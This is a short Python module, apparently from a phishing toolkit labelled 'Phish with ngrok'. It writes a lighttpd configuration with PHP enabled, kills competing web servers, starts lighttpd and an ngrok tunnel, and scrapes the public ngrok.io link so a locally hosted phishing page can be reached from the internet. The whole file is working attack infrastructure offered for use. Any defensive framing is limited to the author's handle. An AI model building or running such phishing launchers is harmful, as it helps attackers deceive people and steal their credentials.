# Date: 03/15/2018
# Author: Ethical-H4CK3R
# Description: Phish with ngrok

from re import compile
from time import sleep
from requests import get 
from subprocess import Popen
from constants import error_log 
from os import getcwd, devnull, remove

LIGHT_TPD_CONFIG = '''
# port
server.port = 80
# location of index.html
server.document-root="{}/web"
# set permissions
server.modules = ("mod_access", "mod_alias", "mod_accesslog",
                   "mod_fastcgi", "mod_redirect", "mod_rewrite")
# php configs
fastcgi.server = (".php" => (("bin-path" => "/usr/bin/php-cgi", "socket" => "/php.socket")))
mimetype.assign = (".html" => "text/html", ".htm" => "text/html", ".txt" => "text/plain",
                    ".jpg" => "image/jpeg", ".png" => "image/png", ".css" => "text/css")
static-file.exclude-extensions = (".fcgi", ".php", ".rb", "~", ".inc")
index-file.names = ("index.htm", "index.html")
'''.format(getcwd())

class Ngrok(object):
 def __init__(self):
  self.devnull = open(devnull, 'w')
  self.error_log = open(error_log, 'a')
  self.url = 'http://localhost:4040/inspect/http'

 def start_ngrok(self):
  Popen(['./ngrok', 'http', '80'], 
    stdout=self.error_log, stderr=self.error_log)

 def stop_ngrok(self):
  Popen(['pkill', 'ngrok']).wait()
  sleep(1)

 @property
 def link(self):
  try:
   sleep(1.5)
   n = compile(r'https://\w+.ngrok.io')
   n = n.search(get(self.url).text)
   return n.group()
  except:pass

class Phish(Ngrok):
 def __init__(self): 
  super(Phish, self).__init__()

 def config(self):
  with open('.light.conf', 'w') as f:f.write(LIGHT_TPD_CONFIG)

 def start(self):
  try:
   self.stop()
   self.config()
   self.start_ngrok()
   Popen(['lighttpd', '-f', '.light.conf'], 
    stdout=self.devnull, stderr=self.devnull).wait()
   return self.link
  except:pass

 def stop(self):
  try:
   Popen(['pkill', 'apache2']).wait()
   Popen(['pkill', 'lighttpd']).wait()
   try:remove('.light.conf')
   except:pass 
   self.stop_ngrok()
   sleep(1)
  except:pass